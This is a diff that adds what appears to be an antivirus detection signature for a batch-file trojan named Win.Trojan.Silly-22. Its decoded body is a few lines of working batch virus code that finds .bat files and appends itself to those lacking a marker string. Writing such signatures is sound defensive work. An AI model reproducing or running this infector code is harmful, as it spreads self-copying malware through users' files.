@@ -1,0 +1,8 @@
+VIRUS NAME: Win.Trojan.Silly-22
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+ul
+for %%q in (*.bat) do set _!=%%q
+for %%w in (%_!%) do find "_!" %%w
+if errorlevel 1 type %0 >> %_!%
